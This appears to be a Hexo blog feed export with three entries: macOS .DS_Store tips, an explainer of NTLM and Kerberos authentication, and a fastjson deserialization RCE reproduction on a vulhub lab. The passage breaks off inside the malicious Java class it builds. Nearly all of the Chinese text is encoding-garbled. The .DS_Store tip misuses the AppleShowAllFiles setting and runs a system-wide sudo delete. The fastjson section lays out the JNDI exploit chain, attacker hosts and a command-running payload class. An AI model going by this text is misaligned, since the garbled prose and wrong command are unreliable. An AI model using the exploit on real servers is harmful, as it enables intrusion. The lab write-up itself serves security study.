<h2 id="å»æ‰çƒ¦äººçš„éšè—æ–‡ä»¶DS-Store"><a href="#å»æ‰çƒ¦äººçš„éšè—æ–‡ä»¶DS-Store" class="headerlink" title="å»æ‰çƒ¦äººçš„éšè—æ–‡ä»¶DS_Store"></a>å»æ‰çƒ¦äººçš„éšè—æ–‡ä»¶DS_Store</h2><h5 id="ç¦æ­¢-DS-Storeç”Ÿæˆ"><a href="#ç¦æ­¢-DS-Storeç”Ÿæˆ" class="headerlink" title="ç¦æ­¢.DS_Storeç”Ÿæˆ"></a>ç¦æ­¢.DS_Storeç”Ÿæˆ</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">defaults write com.<span class="property">apple</span>.<span class="property">finder</span> <span class="title class_">AppleShowAllFiles</span> <span class="variable constant_">FALSE</span>;killall <span class="title class_">Finder</span></span><br></pre></td></tr></table></figure>

<h5 id="æ¢å¤-DS-Storeç”Ÿæˆ"><a href="#æ¢å¤-DS-Storeç”Ÿæˆ" class="headerlink" title="æ¢å¤.DS_Storeç”Ÿæˆ"></a>æ¢å¤.DS_Storeç”Ÿæˆ</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">defaults write com.<span class="property">apple</span>.<span class="property">finder</span> <span class="title class_">AppleShowAllFiles</span> <span class="variable constant_">TRUE</span></span><br><span class="line">defaults <span class="keyword">delete</span> com.<span class="property">apple</span>.<span class="property">desktopservices</span> <span class="title class_">DSDontWriteNetworkStores</span></span><br></pre></td></tr></table></figure>

<h5 id="åˆ é™¤ä¹‹å‰ç”Ÿæˆçš„-DS-Store"><a href="#åˆ é™¤ä¹‹å‰ç”Ÿæˆçš„-DS-Store" class="headerlink" title="åˆ é™¤ä¹‹å‰ç”Ÿæˆçš„.DS_Store"></a>åˆ é™¤ä¹‹å‰ç”Ÿæˆçš„.DS_Store</h5><p>å¯¹å·²ç»ç”Ÿæˆçš„æ–‡ä»¶è¿˜éœ€è¦ä½ æ‰‹åŠ¨åˆ é™¤, æ‰“å¼€<code>ç»ˆç«¯</code>, æ‰§è¡Œä¸‹åˆ—å‘½ä»¤:</p>
<p>ä»£ç è¯­è¨€ï¼šjavascript</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sudo find / -name <span class="string">&quot;.DS_Store&quot;</span> -depth -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<h2 id="finder"><a href="#finder" class="headerlink" title="finder"></a>finder</h2><h3 id="è°ƒæ•´åˆ—å®½"><a href="#è°ƒæ•´åˆ—å®½" class="headerlink" title="è°ƒæ•´åˆ—å®½"></a>è°ƒæ•´åˆ—å®½</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># Finder å¤šåˆ—æ¨¡å¼ è‡ªåŠ¨è°ƒæ•´åˆ—å®½</span><br><span class="line">defaults write com.apple.finder _FXEnableColumnAutoSizing -bool true &amp;&amp; killall Finder</span><br></pre></td></tr></table></figure>

<h3 id="åˆå¹¶æ‰€æœ‰çª—å£"><a href="#åˆå¹¶æ‰€æœ‰çª—å£" class="headerlink" title="åˆå¹¶æ‰€æœ‰çª—å£"></a>åˆå¹¶æ‰€æœ‰çª—å£</h3><p><a href="https://blog.csdn.net/WinstonLau/article/details/106612488">Macç³»ç»Ÿè®¾ç½®åˆå¹¶æ‰€æœ‰è®¿è¾¾çª—å£çš„å¿«æ·é”®</a></p>
]]></content>
      <tags>
        <tag>TODO</tag>
        <tag>MacTips</tag>
        <tag>macå·¥å…·</tag>
        <tag>Macç¾åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>NTLMåŠKerberosè®¤è¯æµç¨‹</title>
    <url>/articles/60487e7c/</url>
    <content><![CDATA[<h1 id="NTLMåŠKerberosè®¤è¯æµç¨‹"><a href="#NTLMåŠKerberosè®¤è¯æµç¨‹" class="headerlink" title="NTLMåŠKerberosè®¤è¯æµç¨‹"></a>NTLMåŠKerberosè®¤è¯æµç¨‹</h1><h2 id="NTLMè®¤è¯"><a href="#NTLMè®¤è¯" class="headerlink" title="NTLMè®¤è¯"></a>NTLMè®¤è¯</h2><h3 id="1-æ¦‚å¿µ"><a href="#1-æ¦‚å¿µ" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>NTLMæ˜¯NT LAN Managerçš„ç¼©å†™ï¼ŒNTLM æ˜¯æŒ‡ telnet çš„ä¸€ç§éªŒè¯èº«ä»½æ–¹å¼ï¼Œå³é—®è¯¢&#x2F;åº”ç­”èº«ä»½éªŒè¯åè®®ï¼Œæ˜¯ Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ï¼ŒWindows 2000 æ”¯æŒ NTLM æ˜¯ä¸ºäº†ä¿æŒå‘åå…¼å®¹ã€‚Windows 2000å†…ç½®ä¸‰ç§åŸºæœ¬å®‰å…¨åè®®ä¹‹ä¸€ã€‚</p>
<h3 id="2-è®¤è¯æµç¨‹"><a href="#2-è®¤è¯æµç¨‹" class="headerlink" title="2.è®¤è¯æµç¨‹"></a>2.è®¤è¯æµç¨‹</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047697.png" alt="Snipaste_2021-09-09_13-48-24"></p>
<p>â‘ ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ç™»å½•å®¢æˆ·ç«¯ï¼Œè¿›è¡Œ<strong>æœ¬åœ°è®¤è¯</strong></p>
<p>â‘¡å®¢æˆ·ç«¯é¦–å…ˆåœ¨æœ¬åœ°åŠ å¯†å½“å‰ç”¨æˆ·çš„å¯†ç ä¸ºå¯†ç æ•£åˆ—ï¼Œå³<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a></p>
<p>â‘¢ç¡®è®¤åŒæ–¹åè®®ç‰ˆæœ¬ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨æ˜æ–‡å‘é€è‡ªå·±çš„è´¦å·</p>
<p>â‘£æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ª16ä½çš„éšæœºæ•°å­—å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå³<strong>challenge</strong></p>
<p>â‘¤å®¢æˆ·ç«¯ä½¿ç”¨<strong>NTLM Hash</strong>æ¥åŠ å¯†<strong>challenge</strong>ï¼Œç”Ÿæˆçš„ç»“æœå³<strong>response</strong></p>
<p>â‘¥æœåŠ¡å™¨å°†<strong>æ˜æ–‡çš„ç”¨æˆ·å</strong>ã€<strong>challenge</strong>ã€<strong>response</strong>å‘ç»™åŸŸæ§åˆ¶å™¨(DC)</p>
<p>â‘¦åŸŸæ§åˆ¶å™¨ç”¨è¿™ä¸ªç”¨æˆ·ååœ¨<strong>SAMå¯†ç ç®¡ç†åº“</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:2">2</a>ä¸­æ‰¾åˆ°æ­¤ç”¨æˆ·å¯¹åº”çš„<strong>NTLM Hash</strong>ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªå€¼æ¥åŠ å¯†<strong>challenge</strong>ï¼Œç”Ÿæˆçš„ç»“æœè®°ä¸º<strong>response2</strong></p>
<p>â‘§åŸŸæ§åˆ¶å™¨å¯¹<strong>response</strong>å’Œ<strong>response2</strong>è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸€æ ·åˆ™è®¤è¯æˆåŠŸï¼Œåä¹‹åˆ™å¤±è´¥</p>
<h4 id="æœ¬åœ°è®¤è¯"><a href="#æœ¬åœ°è®¤è¯" class="headerlink" title="æœ¬åœ°è®¤è¯"></a>æœ¬åœ°è®¤è¯</h4><p>Windowsä¸ä¼šå‚¨å­˜ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œè€Œæ˜¯å°†æ˜æ–‡å¯†ç åŠ å¯†åå‚¨å­˜åœ¨SAMä¸­</p>
<p>æœ¬åœ°è®¤è¯çš„è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šå°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç åŠ å¯†æˆ<strong>NTLM Hash</strong>ï¼Œç„¶åå’ŒSAMä¸­çš„<strong>NTLM Hash</strong>è¿›è¡Œæ¯”è¾ƒä»è€Œå®Œæˆè®¤è¯</p>
<p>ç”¨æˆ·è¿›è¡Œä»»ä½•æ³¨é”€æ“ä½œï¼ˆæ³¨é”€ç™»å½•ï¼Œé‡å¯ï¼Œé”å±ç­‰ï¼‰ï¼Œ<strong>winlogon</strong>è¿›ç¨‹ä¼šæ˜¾ç¤ºå¯†ç è¾“å…¥ç•Œé¢ï¼Œæ¥å—ç”¨æˆ·è¾“å…¥å¯†ç åäº¤ç»™<strong>lsass</strong>è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹ä¸­ä¼šä¿å­˜ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œç„¶ååŠ å¯†æˆ<strong>NTLM Hash</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; æ¥æ”¶ç”¨æˆ·è¾“å…¥ -&gt; lsass.exe -&gt; æœ¬åœ°è®¤è¯</span><br></pre></td></tr></table></figure>

<h4 id="NTLM-Hashçš„ç”Ÿæˆ"><a href="#NTLM-Hashçš„ç”Ÿæˆ" class="headerlink" title="NTLM Hashçš„ç”Ÿæˆ"></a>NTLM Hashçš„ç”Ÿæˆ</h4><ul>
<li>ç”¨æˆ·æ˜æ–‡å¯†ç ï¼š<code>y5neko123</code></li>
<li>åå…­è¿›åˆ¶è½¬æ¢ä¸ºï¼š<code>79356e656b6f313233</code></li>
<li>è½¬æ¢ä¸ºUnicodeç ï¼Œç›¸å½“äºåœ¨æ¯ä¸ªå­—èŠ‚åæ·»åŠ ä¸€ä¸ª0x00ï¼š<code>790035006e0065006b006f00310032003300</code></li>
<li>ä»¥åå…­è¿›åˆ¶è¿›è¡ŒMD4åŠ å¯†ï¼š<code>2aec2647511a853cbec96388c4ae8770</code></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047362.png" alt="image-20210909131622932"></p>
<h2 id="Kerberosè®¤è¯"><a href="#Kerberosè®¤è¯" class="headerlink" title="Kerberosè®¤è¯"></a>Kerberosè®¤è¯</h2><h3 id="1-æ¦‚å¿µ-1"><a href="#1-æ¦‚å¿µ-1" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Kerberos æ˜¯ä¸€ç§ç”± MITï¼ˆéº»çœç†å·¥å¤§å­¦ï¼‰æå‡ºçš„ä¸€ç§ç½‘ç»œèº«ä»½éªŒè¯åè®®ã€‚å®ƒæ—¨åœ¨é€šè¿‡ä½¿ç”¨å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸ºå®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºèº«ä»½éªŒè¯ã€‚</p>
<p>Kerberos ä¸»è¦æ˜¯ç”¨åœ¨åŸŸç¯å¢ƒä¸‹çš„èº«ä»½è®¤è¯åè®®ã€‚</p>
<h3 id="2-è®¤è¯æµç¨‹-1"><a href="#2-è®¤è¯æµç¨‹-1" class="headerlink" title="2.è®¤è¯æµç¨‹"></a>2.è®¤è¯æµç¨‹</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047736.png" alt="img"></p>
<p>Kerberos åè®®ä¸­ä¸»è¦æœ‰å››ä¸ªè§’è‰²çš„å­˜åœ¨ï¼š</p>
<ol>
<li>è®¿é—®æœåŠ¡çš„ Client</li>
<li>æä¾›æœåŠ¡çš„ Server</li>
<li>KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:3">3</a></li>
<li>ADï¼ˆAccount Databaseï¼‰</li>
</ol>
<hr>
<h4 id="KDCçš„æ„æˆ"><a href="#KDCçš„æ„æˆ" class="headerlink" title="KDCçš„æ„æˆ"></a>KDCçš„æ„æˆ</h4><p><strong>Authentication Service</strong>ï¼šè®¤è¯æœåŠ¡å™¨ï¼Œä»¥ä¸‹ç®€ç§°ASï¼Œä½œç”¨å°±æ˜¯éªŒè¯ Client ç«¯çš„èº«ä»½ï¼ŒéªŒè¯é€šè¿‡ä¼šå‘é€ä¸€å¼ <strong>TGTï¼ˆTicket Granting Ticketï¼‰</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a>ç¥¨æ®ç»™ Client</p>
<p><strong>Ticket Granting Service</strong>ï¼šç¥¨æ®åˆ†å‘æœåŠ¡å™¨ï¼Œä»¥ä¸‹ç®€ç§°TGSï¼Œä½œç”¨æ˜¯é€šè¿‡ AS å‘é€ç»™ Client çš„ç¥¨æ®ï¼ˆTGTï¼‰æ¢å–<strong>STï¼ˆServiceTicket</strong>ï¼‰<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a>ï¼Œä¹Ÿè¢«ç§°ä¸º<strong>TGS Ticket</strong></p>
<hr>
<p>Kerberosè®¤è¯å¤§ä½“ä¸Šåˆ†ä¸ºä¸‰ä¸ªæµç¨‹ï¼š</p>
<ol>
<li>The Authentication Service Exchangeï¼šClient ä¸ AS çš„äº¤äº’</li>
<li>The Ticket-Granting Service (TGS) Exchangeï¼šClient ä¸ TGS çš„äº¤äº’</li>
<li>The Client&#x2F;Server Authentication Exchangeï¼šClient ä¸ Server çš„äº¤äº’</li>
</ol>
<hr>
<h4 id="ä¸€ã€Authentication-Service-Exchange"><a href="#ä¸€ã€Authentication-Service-Exchange" class="headerlink" title="ä¸€ã€Authentication Service Exchange"></a>ä¸€ã€Authentication Service Exchange</h4><p><strong>KRB_AS_REQï¼ˆè¯·æ±‚ï¼‰</strong></p>
<p>Client â€“&gt; ASï¼šå®¢æˆ·ç«¯å‘KDCçš„ASå‘é€<strong>Authenticator1</strong>ï¼Œå†…å®¹åŒ…å«ï¼š</p>
<ul>
<li>Pre-authentication dataï¼šåŒ…å«ç”¨ä»¥è¯æ˜è‡ªå·±èº«ä»½çš„ä¿¡æ¯ï¼Œä¸€èˆ¬å®ƒçš„å†…å®¹æ˜¯ä¸€ä¸ªè¢«Client hashåŠ å¯†è¿‡çš„æ—¶é—´æˆ³</li>
<li>Client name &amp; realmï¼šç”¨æˆ·ä¿¡æ¯</li>
<li>TGSçš„Server name</li>
</ul>
<p><strong>KRB_AS_REPï¼ˆå“åº”ï¼‰</strong></p>
<p>AS â€“&gt; Clientï¼šASæ ¹æ®ç”¨æˆ·ååœ¨ADä¸­åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œæ¥ç€è¿›è¡ŒéªŒè¯å‘é€æ–¹æ˜¯å¦ä¸ºClient nameä¸­å£°ç§°çš„ç”¨æˆ·</p>
<p>ä¹Ÿå°±æ˜¯éœ€è¦éªŒè¯å‘é€æ–¹æ˜¯å¦çŸ¥é“è¯¥ç”¨æˆ·åçš„å¯†ç ï¼Œæ­¤æ—¶åªéœ€è¦ä»ADä¸­ä½¿ç”¨ç›¸åº”çš„<strong>NTLM Hash</strong>å¯¹è¯·æ±‚åŒ…ä¸­çš„<strong>Pre-authentication data</strong>è¿›è¡Œè§£å¯†ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªåˆæ³•çš„æ—¶é—´æˆ³ï¼Œåˆ™è¯´æ˜æä¾›çš„å¯†é’¥æ— è¯¯</p>
<p>éªŒè¯æˆåŠŸåæå–ç›¸åº”çš„<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a>ï¼Œæ­¤æ—¶ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°<strong>SessionKey</strong>ï¼Œç„¶åä½¿ç”¨æå–çš„<strong>NTLM Hash</strong>æ¥åŠ å¯†<strong>SessionKey</strong>ï¼Œç”Ÿæˆ<strong>SessionKey-as</strong>ä½œä¸ºASæ•°æ®ï¼Œå†è¿”å›ä¸€ä¸ª<strong>TGT</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a></p>
<blockquote>
<p>  ç®€è¿°ï¼šåœ¨ KDC(AD) ä¸­å­˜å‚¨äº†åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç  HASHï¼Œå½“ AS æ¥æ”¶åˆ° Client çš„è¯·æ±‚ä¹‹åä¼šæ ¹æ® KDC ä¸­å­˜å‚¨çš„å¯†ç æ¥è§£å¯†ï¼Œè§£å¯†æˆåŠŸå¹¶ä¸”éªŒè¯ä¿¡æ¯ï¼ŒéªŒè¯æˆåŠŸåè¿”å›ç»™Clientä¸¤ä¸ªæ•°æ®ï¼Œç”± Client å¯†ç  HASH åŠ å¯†çš„SessionKey-aså’ŒTGTã€‚</p>
</blockquote>
<p>Clientæ”¶åˆ°KRB_AS_REPï¼Œé€šè¿‡è‡ªå·±çš„<strong>NTLM Hash</strong>å¯¹è¿”å›çš„<strong>SessionKey-as</strong>è¿›è¡Œè§£å¯†å¾—åˆ°<strong>SessionKey</strong>åï¼Œå³å¯æºå¸¦<strong>TGT</strong>è¿›å…¥ä¸‹ä¸€æ­¥éª¤</p>
<hr>
<h4 id="äºŒã€Ticket-Granting-Service-TGS-Exchange"><a href="#äºŒã€Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="äºŒã€Ticket-Granting Service (TGS) Exchange"></a>äºŒã€Ticket-Granting Service (TGS) Exchange</h4><p><strong>KRB_TGS_REQï¼ˆè¯·æ±‚ï¼‰</strong></p>
<p>Client â€“&gt; TGSï¼šClientå‘KDCçš„TGSå‘é€<strong>Authenticator2</strong>ï¼Œå†…å®¹åŒ…å«ï¼š</p>
<ul>
<li>TGT</li>
<li>Authenticatorï¼šç”¨ä»¥è¯æ˜å½“åˆTGTçš„æ‹¥æœ‰è€…æ˜¯è‡ªå·±ï¼Œä½¿ç”¨SessionKeyæ¥è¿›è¡ŒåŠ å¯†ï¼Œå…¶ä¸­åŒ…å«æœ‰å®¢æˆ·ç«¯ä¿¡æ¯å’Œæ—¶é—´æˆ³</li>
<li>Client name &amp; realm</li>
<li>Server name &amp; realmï¼šClientè¦è®¿é—®çš„Server</li>
</ul>
<p><strong>KRB_TGS_REPï¼ˆå“åº”ï¼‰</strong></p>
<p>TGS â€“&gt; Clientï¼šTGSé¦–å…ˆé€šè¿‡è‡ªå·±çš„NTLM Hashï¼ˆkrbtgtè´¦æˆ·çš„NTLM Hashï¼‰å¯¹Clientæä¾›çš„TGTè¿›è¡Œè§£å¯†ï¼Œå³å¯å¾—åˆ°<strong>SessionKey</strong>ï¼Œå†é€šè¿‡è¿™ä¸ªSessionKeyè§£å¯†Clientæä¾›çš„<strong>Authenticator</strong>æ¥è¿›è¡ŒéªŒè¯ï¼Œæ­¤æ—¶ç”Ÿæˆä¸€ä¸ª<strong>SessionKey-tgs</strong></p>
<p>éªŒè¯æˆåŠŸåå‘å¯¹æ–¹å‘é€ä¸¤ä¸ªæ•°æ®ï¼š</p>
<ul>
<li>ä½¿ç”¨SessionKeyåŠ å¯†<strong>SessionKey-tgs</strong>ç”Ÿæˆ<strong>SessionKey-tgs-encrypt</strong>ï¼Œç”¨äºClientå’ŒServerçš„è®¤è¯</li>
<li>ä½¿ç”¨Serverçš„NTLM HashåŠ å¯†<strong>SessionKey-tgs</strong>ç”Ÿæˆ<strong>ST</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a></li>
</ul>
<p>Clientæ”¶åˆ°KRB_TGS_REPï¼Œä½¿ç”¨SessionKeyå¯¹è¿”å›çš„<strong>SessionKey-tgs-encrypt</strong>è¿›è¡Œè§£å¯†å¾—åˆ°<strong>SessionKey-tgs</strong>ï¼Œæœ‰äº†<strong>SessionKey-tgs</strong>å’Œ<strong>ST</strong>ï¼ŒClientå°±å¯ä»¥å’ŒServeräº¤äº’äº†ï¼Œè‡³æ­¤TGSçš„ä»»åŠ¡å®Œæˆ</p>
<hr>
<h4 id="ä¸‰ã€Client-Server-Authentication-Exchange"><a href="#ä¸‰ã€Client-Server-Authentication-Exchange" class="headerlink" title="ä¸‰ã€Client&#x2F;Server Authentication Exchange"></a>ä¸‰ã€Client&#x2F;Server Authentication Exchange</h4><p><strong>KRB_AP_REQï¼ˆè¯·æ±‚ï¼‰</strong></p>
<p>Client â€“&gt; Serverï¼šClientå‘Serverå‘é€<strong>Authenticator3</strong>ï¼Œå†…å®¹åŒ…å«ï¼š</p>
<ul>
<li>ST</li>
<li>Authenticatorï¼šç”¨ä»¥è¯æ˜å½“åˆTGTçš„æ‹¥æœ‰è€…æ˜¯è‡ªå·±ï¼Œä½¿ç”¨SessionKeyæ¥è¿›è¡ŒåŠ å¯†ï¼Œå…¶ä¸­åŒ…å«æœ‰å®¢æˆ·ç«¯ä¿¡æ¯å’Œæ—¶é—´æˆ³</li>
<li>Flagï¼šç”¨äºè¡¨ç¤ºClientæ˜¯å¦éœ€è¦è¿›è¡ŒåŒå‘éªŒè¯</li>
</ul>
<p><strong>KRB_AP_REPï¼ˆå“åº”ï¼‰</strong></p>
<p>Server â€“&gt; Clientï¼šServeré¦–å…ˆé€šè¿‡è‡ªå·±çš„NTLM Hashå¯¹æ”¶åˆ°çš„STè¿›è¡Œè§£å¯†ï¼Œå³å¯å¾—åˆ°<strong>SessionKey-tgs</strong>ï¼Œå†é€šè¿‡è¿™ä¸ª<strong>SessionKey-tgs</strong>è§£å¯†æ”¶åˆ°çš„<strong>Authenticator</strong>å³å¯éªŒè¯èº«ä»½ï¼ŒåŸç†åŒä¸Š</p>
<p>æ­¤æ—¶è¿æ¥å»ºç«‹æˆåŠŸã€‚</p>
<blockquote>
<p>  å¯¹äºéœ€è¦è¿›è¡ŒåŒå‘éªŒè¯ï¼ŒServerä»Authenticatoræå–Timestampï¼Œä½¿ç”¨**SessionKey(Server-Client)**è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å°†å…¶å‘é€ç»™Clientç”¨äºClientéªŒè¯Serverçš„èº«ä»½ã€‚</p>
</blockquote>
<hr>
<ol>
<li>é€šå¸¸æ„ä¹‰ä¸Šçš„NTLM HashæŒ‡å­˜å‚¨åœ¨SAMæ•°æ®åº“åŠNTDSæ•°æ®åº“ä¸­å¯¹å¯†ç è¿›è¡Œ Hashæ‘˜è¦è®¡ç®—åçš„ç»“æœï¼Œè¿™ç±» Hashå¯ä»¥ç›´æ¥ç”¨äº PTHï¼Œå¹¶ä¸”é€šå¸¸å­˜åœ¨äºLSASSè¿›ç¨‹ä¸­ï¼Œä¾¿äº SSPï¼ˆNTLM å®‰å…¨æ”¯æŒæä¾›ç¨‹åºï¼‰ä½¿ç”¨ã€‚ Account Manager Databaseï¼Œå®‰å…¨è´¦å·ç®¡ç†æ•°æ®åº“ [</li>
<li>KDC æœåŠ¡é»˜è®¤ä¼šå®‰è£…åœ¨ä¸€ä¸ªåŸŸçš„åŸŸæ§ä¸­ï¼ŒKDC æœåŠ¡æ¡†æ¶ä¸­åŒ…å«ä¸€ä¸ª KRBTGT è´¦æˆ·ï¼Œå®ƒæ˜¯åœ¨åˆ›å»ºåŸŸæ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªè´¦å·ï¼Œæ˜¯ä¸€ä¸ªæ— æ³•ç™»é™†çš„è´¦å·ï¼Œåœ¨å‘æ”¾ç¥¨æ®æ—¶ä¼šä½¿ç”¨åˆ°å®ƒçš„å¯†ç  HASH å€¼ã€‚</li>
<li>TGTåŒ…å«ï¼šä½¿ç”¨KDCä¸­krbtgtè´¦æˆ·çš„NTLM HashåŠ å¯†çš„SessionKeyã€Client name &amp; realmä»¥åŠEnd Timeï¼šTGTçš„åˆ°æœŸæ—¶é—´</li>
<li>å¯ä»¥ç”¨æ¥è®¿é—® Server ç«¯çš„ç¥¨æ®ï¼ŒåŒ…å«ï¼šSessionKey-tgsã€Client name &amp; realmä»¥åŠEnd Timeï¼šSTçš„åˆ°æœŸæ—¶é—´</li>
</ol>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>çŸ¥è¯†åº“</category>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjsonæ¼æ´å¤ç°</title>
    <url>/articles/602d9e2a/</url>
    <content><![CDATA[<h1 id="fastjsonæ¼æ´å¤ç°"><a href="#fastjsonæ¼æ´å¤ç°" class="headerlink" title="fastjsonæ¼æ´å¤ç°"></a>fastjsonæ¼æ´å¤ç°</h1><blockquote>
<p>  Fastjsonæ˜¯ä¸€ä¸ªJavaåº“ï¼Œå¯ç”¨äºå°†Javaå¯¹è±¡è½¬æ¢ä¸ºå…¶JSONè¡¨ç¤ºå½¢å¼ã€‚å®ƒè¿˜å¯ä»¥ç”¨äºå°†JSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºç­‰æ•ˆçš„Javaå¯¹è±¡,fastjsonçˆ†å‡ºå¤šä¸ªååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤æ¼æ´è¿œç¨‹æ‰§è¡Œæ¶æ„ä»£ç æ¥å…¥ä¾µæœåŠ¡å™¨ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹fastjsonç‰ˆæœ¬å°äº1.2.48çš„ç‰ˆæœ¬é€šæ€ï¼ŒautoTypeä¸ºå…³é—­çŠ¶æ€ä¹Ÿå¯ä½¿ç”¨ã€‚</span><br><span class="line">loadClassä¸­é»˜è®¤cacheè®¾ç½®ä¸ºtrueï¼Œåˆ©ç”¨åˆ†ä¸º2æ­¥æ‰§è¡Œï¼Œé¦–å…ˆä½¿ç”¨java.lang.ClassæŠŠè·å–åˆ°çš„ç±»ç¼“å­˜åˆ°mappingä¸­ï¼Œç„¶åç›´æ¥ä»ç¼“å­˜ä¸­è·å–åˆ°äº†com.sun.rowset.JdbcRowSetImplè¿™ä¸ªç±»ï¼Œç»•è¿‡äº†é»‘åå•æœºåˆ¶</span><br><span class="line">è¯¥payloadä¼šåˆ©ç”¨fastjsonçš„ååºåˆ—åŒ–æ¼æ´å»æŒ‡å®šçš„rmi/ldapæœåŠ¡è¿›è¡Œè¿œç¨‹æ–¹æ³•è°ƒç”¨</span><br></pre></td></tr></table></figure>



<blockquote>
<p>ä¸»æœºAï¼š <a href="http://192.168.56.106:8090/">http://192.168.56.106:8090</a> (å­˜åœ¨Fastjsonæ¼æ´ä¸»æœº)</p>
<p>ä¸»æœºBï¼š <a href="http://192.168.56.1:8989/">http://192.168.56.1:8989</a> (æ¶æ„javaç±»æœåŠ¡)</p>
<p>ä¸»æœºCï¼š rmi:&#x2F;&#x2F;192.168.56.1:9999 (è¿œç¨‹æ–¹æ³•è°ƒç”¨æœåŠ¡)</p>
<p> PS:   å®é™…ä¸Šä¸»æœºBå’ŒCæ˜¯ä¸€å°æœºå™¨ä¸åŒç«¯å£</p>
</blockquote>
<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson&#x2F;1.2.24-rce"></a>fastjson&#x2F;1.2.24-rce</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä½¿ç”¨ <code>vulhub</code> æ­å»º </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143662.png" alt="image-20210901132856918" style="zoom:80%;" />

<p>å› ä¸ºç›®æ ‡ç¯å¢ƒæ˜¯Java 8u102ï¼Œæ²¡æœ‰<code>com.sun.jndi.rmi.object.trustURLCodebase</code>çš„é™åˆ¶ï¼Œ</p>
<p>å¯ä»¥ä½¿ç”¨<code>com.sun.rowset.JdbcRowSetImpl</code>çš„åˆ©ç”¨é“¾ï¼Œå€ŸåŠ©JNDIæ³¨å…¥æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>Command ï¼š <code>touch /tmp/success</code>   </p>
<blockquote>
<h5 id="TouchFile-java"><a href="#TouchFile-java" class="headerlink" title="TouchFile.java"></a>TouchFile.java</h5></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 